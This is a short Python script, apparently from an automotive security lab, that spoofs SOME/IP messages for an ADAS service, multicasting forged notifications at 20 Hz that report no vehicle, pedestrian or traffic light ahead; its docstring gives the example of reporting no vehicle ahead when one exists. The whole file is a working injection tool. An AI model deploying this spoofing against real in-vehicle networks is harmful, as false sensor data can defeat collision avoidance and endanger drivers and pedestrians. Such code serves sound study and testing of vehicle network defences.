"""
Spoofing attack — injeta dados ADAS falsos no Service 0x1005.
Ex: reportar que nao ha veiculo a frente quando ha.
"""

import socket
import time
import json

from someip_network.packet import SomeIPPacket
from someip_network import SERVICE_ADAS, METHOD_NOTIFY
from someip_network.network import MULTICAST_GROUP, MULTICAST_PORT


FAKE_PAYLOAD = {
    'veiculo':  False,
    'pedestre': False,
    'semaforo': False,
    'dist_m':   None,
    'n_veic':   0,
    'n_ped':    0,
}


def run(rate_hz=20, duration_s=30, payload_override: dict = None):
    payload = {**FAKE_PAYLOAD, **(payload_override or {})}
    sock    = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    interval = 1.0 / rate_hz
    deadline = time.time() + duration_s
    session  = 0
    sent     = 0

    print(f'[Spoof] Injetando ADAS falso @ {rate_hz}Hz por {duration_s}s')
    print(f'[Spoof] Payload: {payload}')

    while time.time() < deadline:
        session = (session % 0xFFFF) + 1
        pkt = SomeIPPacket(
            service_id = SERVICE_ADAS,
            method_id  = METHOD_NOTIFY,
            session_id = session,
            payload    = payload,
        )
        sock.sendto(pkt.encode(), (MULTICAST_GROUP, MULTICAST_PORT))
        sent += 1
        time.sleep(interval)

    sock.close()
    print(f'[Spoof] Encerrado — {sent} pacotes injetados')


if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument('--rate',     type=int, default=20)
    p.add_argument('--duration', type=int, default=30)
    args = p.parse_args()
    run(args.rate, args.duration)
